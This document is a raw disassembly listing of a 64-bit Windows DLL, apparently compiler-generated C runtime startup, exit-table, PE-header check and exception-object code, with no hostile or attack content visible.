   180004348:	75 ee                	jne    0x180004338
   18000434a:	32 c0                	xor    %al,%al
   18000434c:	48 83 c4 28          	add    $0x28,%rsp
   180004350:	c3                   	ret
   180004351:	b0 01                	mov    $0x1,%al
   180004353:	eb f7                	jmp    0x18000434c
   180004355:	cc                   	int3
   180004356:	cc                   	int3
   180004357:	cc                   	int3
   180004358:	48 83 ec 28          	sub    $0x28,%rsp
   18000435c:	e8 a7 08 00 00       	call   0x180004c08
   180004361:	85 c0                	test   %eax,%eax
   180004363:	74 07                	je     0x18000436c
   180004365:	e8 da 06 00 00       	call   0x180004a44
   18000436a:	eb 19                	jmp    0x180004385
   18000436c:	e8 8f 08 00 00       	call   0x180004c00
   180004371:	8b c8                	mov    %eax,%ecx
   180004373:	e8 b8 44 00 00       	call   0x180008830
   180004378:	85 c0                	test   %eax,%eax
   18000437a:	74 04                	je     0x180004380
   18000437c:	32 c0                	xor    %al,%al
   18000437e:	eb 07                	jmp    0x180004387
   180004380:	e8 5f 48 00 00       	call   0x180008be4
   180004385:	b0 01                	mov    $0x1,%al
   180004387:	48 83 c4 28          	add    $0x28,%rsp
   18000438b:	c3                   	ret
   18000438c:	48 83 ec 28          	sub    $0x28,%rsp
   180004390:	33 c9                	xor    %ecx,%ecx
   180004392:	e8 41 01 00 00       	call   0x1800044d8
   180004397:	84 c0                	test   %al,%al
   180004399:	0f 95 c0             	setne  %al
   18000439c:	48 83 c4 28          	add    $0x28,%rsp
   1800043a0:	c3                   	ret
   1800043a1:	cc                   	int3
   1800043a2:	cc                   	int3
   1800043a3:	cc                   	int3
   1800043a4:	48 83 ec 28          	sub    $0x28,%rsp
   1800043a8:	e8 b3 0e 00 00       	call   0x180005260
   1800043ad:	84 c0                	test   %al,%al
   1800043af:	75 04                	jne    0x1800043b5
   1800043b1:	32 c0                	xor    %al,%al
   1800043b3:	eb 12                	jmp    0x1800043c7
   1800043b5:	e8 82 4b 00 00       	call   0x180008f3c
   1800043ba:	84 c0                	test   %al,%al
   1800043bc:	75 07                	jne    0x1800043c5
   1800043be:	e8 b1 0e 00 00       	call   0x180005274
   1800043c3:	eb ec                	jmp    0x1800043b1
   1800043c5:	b0 01                	mov    $0x1,%al
   1800043c7:	48 83 c4 28          	add    $0x28,%rsp
   1800043cb:	c3                   	ret
   1800043cc:	48 83 ec 28          	sub    $0x28,%rsp
   1800043d0:	e8 7b 4b 00 00       	call   0x180008f50
   1800043d5:	e8 9a 0e 00 00       	call   0x180005274
   1800043da:	b0 01                	mov    $0x1,%al
   1800043dc:	48 83 c4 28          	add    $0x28,%rsp
   1800043e0:	c3                   	ret
   1800043e1:	cc                   	int3
   1800043e2:	cc                   	int3
   1800043e3:	cc                   	int3
   1800043e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800043e9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1800043ee:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800043f3:	57                   	push   %rdi
   1800043f4:	48 83 ec 20          	sub    $0x20,%rsp
   1800043f8:	49 8b f9             	mov    %r9,%rdi
   1800043fb:	49 8b f0             	mov    %r8,%rsi
   1800043fe:	8b da                	mov    %edx,%ebx
   180004400:	48 8b e9             	mov    %rcx,%rbp
   180004403:	e8 00 08 00 00       	call   0x180004c08
   180004408:	85 c0                	test   %eax,%eax
   18000440a:	75 17                	jne    0x180004423
   18000440c:	83 fb 01             	cmp    $0x1,%ebx
   18000440f:	75 12                	jne    0x180004423
   180004411:	48 8b cf             	mov    %rdi,%rcx
   180004414:	e8 7f 04 00 00       	call   0x180004898
   180004419:	4c 8b c6             	mov    %rsi,%r8
   18000441c:	33 d2                	xor    %edx,%edx
   18000441e:	48 8b cd             	mov    %rbp,%rcx
   180004421:	ff d7                	call   *%rdi
   180004423:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   180004428:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   18000442c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004431:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180004436:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000443b:	48 83 c4 20          	add    $0x20,%rsp
   18000443f:	5f                   	pop    %rdi
   180004440:	e9 83 3d 00 00       	jmp    0x1800081c8
   180004445:	cc                   	int3
   180004446:	cc                   	int3
   180004447:	cc                   	int3
   180004448:	48 83 ec 28          	sub    $0x28,%rsp
   18000444c:	e8 b7 07 00 00       	call   0x180004c08
   180004451:	85 c0                	test   %eax,%eax
   180004453:	74 10                	je     0x180004465
   180004455:	48 8d 0d cc c4 01 00 	lea    0x1c4cc(%rip),%rcx        # 0x180020928
   18000445c:	48 83 c4 28          	add    $0x28,%rsp
   180004460:	e9 0f 49 00 00       	jmp    0x180008d74
   180004465:	e8 a2 41 00 00       	call   0x18000860c
   18000446a:	85 c0                	test   %eax,%eax
   18000446c:	75 05                	jne    0x180004473
   18000446e:	e8 7d 41 00 00       	call   0x1800085f0
   180004473:	48 83 c4 28          	add    $0x28,%rsp
   180004477:	c3                   	ret
   180004478:	48 83 ec 28          	sub    $0x28,%rsp
   18000447c:	33 c9                	xor    %ecx,%ecx
   18000447e:	e8 f1 4a 00 00       	call   0x180008f74
   180004483:	48 83 c4 28          	add    $0x28,%rsp
   180004487:	e9 1c 0e 00 00       	jmp    0x1800052a8
   18000448c:	40 53                	rex push %rbx
   18000448e:	48 83 ec 20          	sub    $0x20,%rsp
   180004492:	0f b6 05 bf c4 01 00 	movzbl 0x1c4bf(%rip),%eax        # 0x180020958
   180004499:	85 c9                	test   %ecx,%ecx
   18000449b:	bb 01 00 00 00       	mov    $0x1,%ebx
   1800044a0:	0f 44 c3             	cmove  %ebx,%eax
   1800044a3:	88 05 af c4 01 00    	mov    %al,0x1c4af(%rip)        # 0x180020958
   1800044a9:	e8 96 05 00 00       	call   0x180004a44
   1800044ae:	e8 79 0d 00 00       	call   0x18000522c
   1800044b3:	84 c0                	test   %al,%al
   1800044b5:	75 04                	jne    0x1800044bb
   1800044b7:	32 c0                	xor    %al,%al
   1800044b9:	eb 14                	jmp    0x1800044cf
   1800044bb:	e8 68 4a 00 00       	call   0x180008f28
   1800044c0:	84 c0                	test   %al,%al
   1800044c2:	75 09                	jne    0x1800044cd
   1800044c4:	33 c9                	xor    %ecx,%ecx
   1800044c6:	e8 bd 0d 00 00       	call   0x180005288
   1800044cb:	eb ea                	jmp    0x1800044b7
   1800044cd:	8a c3                	mov    %bl,%al
   1800044cf:	48 83 c4 20          	add    $0x20,%rsp
   1800044d3:	5b                   	pop    %rbx
   1800044d4:	c3                   	ret
   1800044d5:	cc                   	int3
   1800044d6:	cc                   	int3
   1800044d7:	cc                   	int3
   1800044d8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800044dd:	55                   	push   %rbp
   1800044de:	48 8b ec             	mov    %rsp,%rbp
   1800044e1:	48 83 ec 40          	sub    $0x40,%rsp
   1800044e5:	80 3d 30 c4 01 00 00 	cmpb   $0x0,0x1c430(%rip)        # 0x18002091c
   1800044ec:	8b d9                	mov    %ecx,%ebx
   1800044ee:	0f 85 ab 00 00 00    	jne    0x18000459f
   1800044f4:	83 f9 01             	cmp    $0x1,%ecx
   1800044f7:	0f 87 af 00 00 00    	ja     0x1800045ac
   1800044fd:	e8 06 07 00 00       	call   0x180004c08
   180004502:	85 c0                	test   %eax,%eax
   180004504:	74 2d                	je     0x180004533
   180004506:	85 db                	test   %ebx,%ebx
   180004508:	75 29                	jne    0x180004533
   18000450a:	48 8d 0d 17 c4 01 00 	lea    0x1c417(%rip),%rcx        # 0x180020928
   180004511:	e8 9a 48 00 00       	call   0x180008db0
   180004516:	85 c0                	test   %eax,%eax
   180004518:	74 07                	je     0x180004521
   18000451a:	32 c0                	xor    %al,%al
   18000451c:	e9 80 00 00 00       	jmp    0x1800045a1
   180004521:	48 8d 0d 18 c4 01 00 	lea    0x1c418(%rip),%rcx        # 0x180020940
   180004528:	e8 83 48 00 00       	call   0x180008db0
   18000452d:	85 c0                	test   %eax,%eax
   18000452f:	74 67                	je     0x180004598
   180004531:	eb e7                	jmp    0x18000451a
   180004533:	48 8b 15 ce aa 01 00 	mov    0x1aace(%rip),%rdx        # 0x18001f008
   18000453a:	b9 40 00 00 00       	mov    $0x40,%ecx
   18000453f:	8b c2                	mov    %edx,%eax
   180004541:	83 e0 3f             	and    $0x3f,%eax
   180004544:	2b c8                	sub    %eax,%ecx
   180004546:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000454a:	48 d3 c8             	ror    %cl,%rax
   18000454d:	48 33 c2             	xor    %rdx,%rax
   180004550:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   180004554:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   180004558:	0f 10 45 e0          	movups -0x20(%rbp),%xmm0
   18000455c:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   180004560:	f2 0f 10 4d f0       	movsd  -0x10(%rbp),%xmm1
   180004565:	0f 11 05 bc c3 01 00 	movups %xmm0,0x1c3bc(%rip)        # 0x180020928
   18000456c:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   180004570:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   180004574:	0f 10 45 e0          	movups -0x20(%rbp),%xmm0
   180004578:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   18000457c:	f2 0f 11 0d b4 c3 01 	movsd  %xmm1,0x1c3b4(%rip)        # 0x180020938
   180004583:	00 
   180004584:	f2 0f 10 4d f0       	movsd  -0x10(%rbp),%xmm1
   180004589:	0f 11 05 b0 c3 01 00 	movups %xmm0,0x1c3b0(%rip)        # 0x180020940
   180004590:	f2 0f 11 0d b8 c3 01 	movsd  %xmm1,0x1c3b8(%rip)        # 0x180020950
   180004597:	00 
   180004598:	c6 05 7d c3 01 00 01 	movb   $0x1,0x1c37d(%rip)        # 0x18002091c
   18000459f:	b0 01                	mov    $0x1,%al
   1800045a1:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1800045a6:	48 83 c4 40          	add    $0x40,%rsp
   1800045aa:	5d                   	pop    %rbp
   1800045ab:	c3                   	ret
   1800045ac:	b9 05 00 00 00       	mov    $0x5,%ecx
   1800045b1:	e8 fe 00 00 00       	call   0x1800046b4
   1800045b6:	cc                   	int3
   1800045b7:	cc                   	int3
   1800045b8:	48 83 ec 18          	sub    $0x18,%rsp
   1800045bc:	4c 8b c1             	mov    %rcx,%r8
   1800045bf:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   1800045c4:	66 39 05 35 ba ff ff 	cmp    %ax,-0x45cb(%rip)        # 0x180000000
   1800045cb:	75 79                	jne    0x180004646
   1800045cd:	48 63 05 68 ba ff ff 	movslq -0x4598(%rip),%rax        # 0x18000003c
   1800045d4:	48 8d 15 25 ba ff ff 	lea    -0x45db(%rip),%rdx        # 0x180000000
   1800045db:	48 8d 0c 10          	lea    (%rax,%rdx,1),%rcx
   1800045df:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1800045e5:	75 5f                	jne    0x180004646
   1800045e7:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1800045ec:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1800045f0:	75 54                	jne    0x180004646
   1800045f2:	4c 2b c2             	sub    %rdx,%r8
   1800045f5:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1800045f9:	48 8d 51 18          	lea    0x18(%rcx),%rdx
   1800045fd:	48 03 d0             	add    %rax,%rdx
   180004600:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   180004604:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180004608:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   18000460c:	48 89 14 24          	mov    %rdx,(%rsp)
   180004610:	49 3b d1             	cmp    %r9,%rdx
   180004613:	74 18                	je     0x18000462d
   180004615:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   180004618:	4c 3b c1             	cmp    %rcx,%r8
   18000461b:	72 0a                	jb     0x180004627
   18000461d:	8b 42 08             	mov    0x8(%rdx),%eax
   180004620:	03 c1                	add    %ecx,%eax
   180004622:	4c 3b c0             	cmp    %rax,%r8
   180004625:	72 08                	jb     0x18000462f
   180004627:	48 83 c2 28          	add    $0x28,%rdx
   18000462b:	eb df                	jmp    0x18000460c
   18000462d:	33 d2                	xor    %edx,%edx
   18000462f:	48 85 d2             	test   %rdx,%rdx
   180004632:	75 04                	jne    0x180004638
   180004634:	32 c0                	xor    %al,%al
   180004636:	eb 14                	jmp    0x18000464c
   180004638:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   18000463c:	7d 04                	jge    0x180004642
   18000463e:	32 c0                	xor    %al,%al
   180004640:	eb 0a                	jmp    0x18000464c
   180004642:	b0 01                	mov    $0x1,%al
   180004644:	eb 06                	jmp    0x18000464c
   180004646:	32 c0                	xor    %al,%al
   180004648:	eb 02                	jmp    0x18000464c
   18000464a:	32 c0                	xor    %al,%al
   18000464c:	48 83 c4 18          	add    $0x18,%rsp
   180004650:	c3                   	ret
   180004651:	cc                   	int3
   180004652:	cc                   	int3
   180004653:	cc                   	int3
   180004654:	40 53                	rex push %rbx
   180004656:	48 83 ec 20          	sub    $0x20,%rsp
   18000465a:	8a d9                	mov    %cl,%bl
   18000465c:	e8 a7 05 00 00       	call   0x180004c08
   180004661:	33 d2                	xor    %edx,%edx
   180004663:	85 c0                	test   %eax,%eax
   180004665:	74 0b                	je     0x180004672
   180004667:	84 db                	test   %bl,%bl
   180004669:	75 07                	jne    0x180004672
   18000466b:	48 87 15 ae c2 01 00 	xchg   %rdx,0x1c2ae(%rip)        # 0x180020920
   180004672:	48 83 c4 20          	add    $0x20,%rsp
   180004676:	5b                   	pop    %rbx
   180004677:	c3                   	ret
   180004678:	40 53                	rex push %rbx
   18000467a:	48 83 ec 20          	sub    $0x20,%rsp
   18000467e:	80 3d d3 c2 01 00 00 	cmpb   $0x0,0x1c2d3(%rip)        # 0x180020958
   180004685:	8a d9                	mov    %cl,%bl
   180004687:	74 04                	je     0x18000468d
   180004689:	84 d2                	test   %dl,%dl
   18000468b:	75 0e                	jne    0x18000469b
   18000468d:	8a cb                	mov    %bl,%cl
   18000468f:	e8 cc 48 00 00       	call   0x180008f60
   180004694:	8a cb                	mov    %bl,%cl
   180004696:	e8 ed 0b 00 00       	call   0x180005288
   18000469b:	b0 01                	mov    $0x1,%al
   18000469d:	48 83 c4 20          	add    $0x20,%rsp
   1800046a1:	5b                   	pop    %rbx
   1800046a2:	c3                   	ret
   1800046a3:	cc                   	int3
   1800046a4:	48 8d 05 8d ce 01 00 	lea    0x1ce8d(%rip),%rax        # 0x180021538
   1800046ab:	c3                   	ret
   1800046ac:	83 25 a9 c2 01 00 00 	andl   $0x0,0x1c2a9(%rip)        # 0x18002095c
   1800046b3:	c3                   	ret
   1800046b4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800046b9:	55                   	push   %rbp
   1800046ba:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   1800046c1:	ff 
   1800046c2:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   1800046c9:	8b d9                	mov    %ecx,%ebx
   1800046cb:	b9 17 00 00 00       	mov    $0x17,%ecx
   1800046d0:	e8 89 de 00 00       	call   0x18001255e
   1800046d5:	85 c0                	test   %eax,%eax
   1800046d7:	74 04                	je     0x1800046dd
   1800046d9:	8b cb                	mov    %ebx,%ecx
   1800046db:	cd 29                	int    $0x29
   1800046dd:	b9 03 00 00 00       	mov    $0x3,%ecx
   1800046e2:	e8 c5 ff ff ff       	call   0x1800046ac
   1800046e7:	33 d2                	xor    %edx,%edx
   1800046e9:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800046ed:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   1800046f3:	e8 d8 0b 00 00       	call   0x1800052d0
   1800046f8:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800046fc:	ff 15 9e fa 00 00    	call   *0xfa9e(%rip)        # 0x1800141a0
   180004702:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   180004709:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   180004710:	48 8b cb             	mov    %rbx,%rcx
   180004713:	45 33 c0             	xor    %r8d,%r8d
   180004716:	ff 15 8c fa 00 00    	call   *0xfa8c(%rip)        # 0x1800141a8
   18000471c:	48 85 c0             	test   %rax,%rax
   18000471f:	74 3c                	je     0x18000475d
   180004721:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180004727:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   18000472e:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   180004735:	4c 8b c8             	mov    %rax,%r9
   180004738:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   18000473d:	4c 8b c3             	mov    %rbx,%r8
   180004740:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   180004747:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   18000474c:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180004750:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180004755:	33 c9                	xor    %ecx,%ecx
   180004757:	ff 15 53 fa 00 00    	call   *0xfa53(%rip)        # 0x1800141b0
   18000475d:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   180004764:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180004769:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   180004770:	33 d2                	xor    %edx,%edx
   180004772:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   180004779:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   18000477f:	48 83 c0 08          	add    $0x8,%rax
   180004783:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   18000478a:	e8 41 0b 00 00       	call   0x1800052d0
   18000478f:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   180004796:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   18000479b:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   1800047a2:	40 
   1800047a3:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   1800047aa:	00 
   1800047ab:	ff 15 47 fa 00 00    	call   *0xfa47(%rip)        # 0x1800141f8
   1800047b1:	83 f8 01             	cmp    $0x1,%eax
   1800047b4:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1800047b9:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1800047be:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1800047c2:	0f 94 c3             	sete   %bl
   1800047c5:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1800047ca:	33 c9                	xor    %ecx,%ecx
   1800047cc:	ff 15 ee f9 00 00    	call   *0xf9ee(%rip)        # 0x1800141c0
   1800047d2:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800047d7:	ff 15 db f9 00 00    	call   *0xf9db(%rip)        # 0x1800141b8
   1800047dd:	85 c0                	test   %eax,%eax
   1800047df:	75 0c                	jne    0x1800047ed
   1800047e1:	84 db                	test   %bl,%bl
   1800047e3:	75 08                	jne    0x1800047ed
   1800047e5:	8d 48 03             	lea    0x3(%rax),%ecx
   1800047e8:	e8 bf fe ff ff       	call   0x1800046ac
   1800047ed:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   1800047f4:	00 
   1800047f5:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   1800047fc:	5d                   	pop    %rbp
   1800047fd:	c3                   	ret
   1800047fe:	cc                   	int3
   1800047ff:	cc                   	int3
   180004800:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180004805:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000480a:	57                   	push   %rdi
   18000480b:	48 83 ec 20          	sub    $0x20,%rsp
   18000480f:	48 8d 1d da 7f 01 00 	lea    0x17fda(%rip),%rbx        # 0x18001c7f0
   180004816:	48 8d 35 d3 7f 01 00 	lea    0x17fd3(%rip),%rsi        # 0x18001c7f0
   18000481d:	eb 16                	jmp    0x180004835
   18000481f:	48 8b 3b             	mov    (%rbx),%rdi
   180004822:	48 85 ff             	test   %rdi,%rdi
   180004825:	74 0a                	je     0x180004831
   180004827:	48 8b cf             	mov    %rdi,%rcx
   18000482a:	e8 69 00 00 00       	call   0x180004898
   18000482f:	ff d7                	call   *%rdi
   180004831:	48 83 c3 08          	add    $0x8,%rbx
   180004835:	48 3b de             	cmp    %rsi,%rbx
   180004838:	72 e5                	jb     0x18000481f
   18000483a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000483f:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180004844:	48 83 c4 20          	add    $0x20,%rsp
   180004848:	5f                   	pop    %rdi
   180004849:	c3                   	ret
   18000484a:	cc                   	int3
   18000484b:	cc                   	int3
   18000484c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180004851:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180004856:	57                   	push   %rdi
   180004857:	48 83 ec 20          	sub    $0x20,%rsp
   18000485b:	48 8d 1d 9e 7f 01 00 	lea    0x17f9e(%rip),%rbx        # 0x18001c800
   180004862:	48 8d 35 97 7f 01 00 	lea    0x17f97(%rip),%rsi        # 0x18001c800
   180004869:	eb 16                	jmp    0x180004881
   18000486b:	48 8b 3b             	mov    (%rbx),%rdi
   18000486e:	48 85 ff             	test   %rdi,%rdi
   180004871:	74 0a                	je     0x18000487d
   180004873:	48 8b cf             	mov    %rdi,%rcx
   180004876:	e8 1d 00 00 00       	call   0x180004898
   18000487b:	ff d7                	call   *%rdi
   18000487d:	48 83 c3 08          	add    $0x8,%rbx
   180004881:	48 3b de             	cmp    %rsi,%rbx
   180004884:	72 e5                	jb     0x18000486b
   180004886:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000488b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180004890:	48 83 c4 20          	add    $0x20,%rsp
   180004894:	5f                   	pop    %rdi
   180004895:	c3                   	ret
   180004896:	cc                   	int3
   180004897:	cc                   	int3
   180004898:	48 ff 25 09 fb 00 00 	rex.W jmp *0xfb09(%rip)        # 0x1800143a8
   18000489f:	cc                   	int3
   1800048a0:	40 53                	rex push %rbx
   1800048a2:	48 83 ec 20          	sub    $0x20,%rsp
   1800048a6:	48 8b d9             	mov    %rcx,%rbx
   1800048a9:	48 8b c2             	mov    %rdx,%rax
   1800048ac:	48 8d 0d ad fb 00 00 	lea    0xfbad(%rip),%rcx        # 0x180014460
   1800048b3:	48 89 0b             	mov    %rcx,(%rbx)
   1800048b6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1800048ba:	33 c9                	xor    %ecx,%ecx
   1800048bc:	48 89 0a             	mov    %rcx,(%rdx)
   1800048bf:	48 89 4a 08          	mov    %rcx,0x8(%rdx)
   1800048c3:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800048c7:	e8 b4 0b 00 00       	call   0x180005480
   1800048cc:	48 8d 05 bd fb 00 00 	lea    0xfbbd(%rip),%rax        # 0x180014490
   1800048d3:	48 89 03             	mov    %rax,(%rbx)
   1800048d6:	48 8b c3             	mov    %rbx,%rax
   1800048d9:	48 83 c4 20          	add    $0x20,%rsp
   1800048dd:	5b                   	pop    %rbx
   1800048de:	c3                   	ret
   1800048df:	cc                   	int3
   1800048e0:	33 c0                	xor    %eax,%eax
   1800048e2:	48 89 41 10          	mov    %rax,0x10(%rcx)
   1800048e6:	48 8d 05 b3 fb 00 00 	lea    0xfbb3(%rip),%rax        # 0x1800144a0
   1800048ed:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1800048f1:	48 8d 05 98 fb 00 00 	lea    0xfb98(%rip),%rax        # 0x180014490
   1800048f8:	48 89 01             	mov    %rax,(%rcx)
   1800048fb:	48 8b c1             	mov    %rcx,%rax
   1800048fe:	c3                   	ret
   1800048ff:	cc                   	int3
   180004900:	40 53                	rex push %rbx
   180004902:	48 83 ec 20          	sub    $0x20,%rsp
   180004906:	48 8b d9             	mov    %rcx,%rbx
   180004909:	48 8b c2             	mov    %rdx,%rax
   18000490c:	48 8d 0d 4d fb 00 00 	lea    0xfb4d(%rip),%rcx        # 0x180014460
   180004913:	48 89 0b             	mov    %rcx,(%rbx)
   180004916:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000491a:	33 c9                	xor    %ecx,%ecx
   18000491c:	48 89 0a             	mov    %rcx,(%rdx)
   18000491f:	48 89 4a 08          	mov    %rcx,0x8(%rdx)
   180004923:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180004927:	e8 54 0b 00 00       	call   0x180005480
   18000492c:	48 8d 05 85 fb 00 00 	lea    0xfb85(%rip),%rax        # 0x1800144b8
   180004933:	48 89 03             	mov    %rax,(%rbx)
   180004936:	48 8b c3             	mov    %rbx,%rax
   180004939:	48 83 c4 20          	add    $0x20,%rsp
   18000493d:	5b                   	pop    %rbx
   18000493e:	c3                   	ret
   18000493f:	cc                   	int3
   180004940:	33 c0                	xor    %eax,%eax
   180004942:	48 89 41 10          	mov    %rax,0x10(%rcx)
   180004946:	48 8d 05 7b fb 00 00 	lea    0xfb7b(%rip),%rax        # 0x1800144c8
   18000494d:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180004951:	48 8d 05 60 fb 00 00 	lea    0xfb60(%rip),%rax        # 0x1800144b8
   180004958:	48 89 01             	mov    %rax,(%rcx)
   18000495b:	48 8b c1             	mov    %rcx,%rax
   18000495e:	c3                   	ret
   18000495f:	cc                   	int3
   180004960:	40 53                	rex push %rbx
   180004962:	48 83 ec 20          	sub    $0x20,%rsp
   180004966:	48 8b d9             	mov    %rcx,%rbx
   180004969:	48 8b c2             	mov    %rdx,%rax
   18000496c:	48 8d 0d ed fa 00 00 	lea    0xfaed(%rip),%rcx        # 0x180014460
   180004973:	48 89 0b             	mov    %rcx,(%rbx)
   180004976:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000497a:	33 c9                	xor    %ecx,%ecx
   18000497c:	48 89 0a             	mov    %rcx,(%rdx)
   18000497f:	48 89 4a 08          	mov    %rcx,0x8(%rdx)
   180004983:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180004987:	e8 f4 0a 00 00       	call   0x180005480
   18000498c:	48 8b c3             	mov    %rbx,%rax
   18000498f:	48 83 c4 20          	add    $0x20,%rsp
   180004993:	5b                   	pop    %rbx
   180004994:	c3                   	ret
   180004995:	cc                   	int3
   180004996:	cc                   	int3
   180004997:	cc                   	int3
   180004998:	48 8d 05 c1 fa 00 00 	lea    0xfac1(%rip),%rax        # 0x180014460
   18000499f:	48 89 01             	mov    %rax,(%rcx)
   1800049a2:	48 83 c1 08          	add    $0x8,%rcx
   1800049a6:	e9 65 0b 00 00       	jmp    0x180005510
   1800049ab:	cc                   	int3
   1800049ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800049b1:	57                   	push   %rdi
   1800049b2:	48 83 ec 20          	sub    $0x20,%rsp
   1800049b6:	48 8d 05 a3 fa 00 00 	lea    0xfaa3(%rip),%rax        # 0x180014460
   1800049bd:	48 8b f9             	mov    %rcx,%rdi
   1800049c0:	48 89 01             	mov    %rax,(%rcx)
   1800049c3:	8b da                	mov    %edx,%ebx
   1800049c5:	48 83 c1 08          	add    $0x8,%rcx
   1800049c9:	e8 42 0b 00 00       	call   0x180005510
   1800049ce:	f6 c3 01             	test   $0x1,%bl
   1800049d1:	74 0d                	je     0x1800049e0
   1800049d3:	ba 18 00 00 00       	mov    $0x18,%edx
   1800049d8:	48 8b cf             	mov    %rdi,%rcx
   1800049db:	e8 38 02 00 00       	call   0x180004c18
   1800049e0:	48 8b c7             	mov    %rdi,%rax
   1800049e3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800049e8:	48 83 c4 20          	add    $0x20,%rsp
   1800049ec:	5f                   	pop    %rdi
   1800049ed:	c3                   	ret
   1800049ee:	cc                   	int3
   1800049ef:	cc                   	int3
   1800049f0:	48 83 ec 48          	sub    $0x48,%rsp
   1800049f4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800049f9:	e8 e2 fe ff ff       	call   0x1800048e0
   1800049fe:	48 8d 15 b3 8d 01 00 	lea    0x18db3(%rip),%rdx        # 0x18001d7b8
   180004a05:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180004a0a:	e8 29 0b 00 00       	call   0x180005538
   180004a0f:	cc                   	int3
   180004a10:	48 83 ec 48          	sub    $0x48,%rsp
   180004a14:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180004a19:	e8 22 ff ff ff       	call   0x180004940
   180004a1e:	48 8d 15 1b 8e 01 00 	lea    0x18e1b(%rip),%rdx        # 0x18001d840
   180004a25:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180004a2a:	e8 09 0b 00 00       	call   0x180005538
   180004a2f:	cc                   	int3
   180004a30:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   180004a35:	48 8d 05 34 fa 00 00 	lea    0xfa34(%rip),%rax        # 0x180014470
   180004a3c:	48 0f 45 41 08       	cmovne 0x8(%rcx),%rax
   180004a41:	c3                   	ret
   180004a42:	cc                   	int3
   180004a43:	cc                   	int3
   180004a44:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180004a49:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
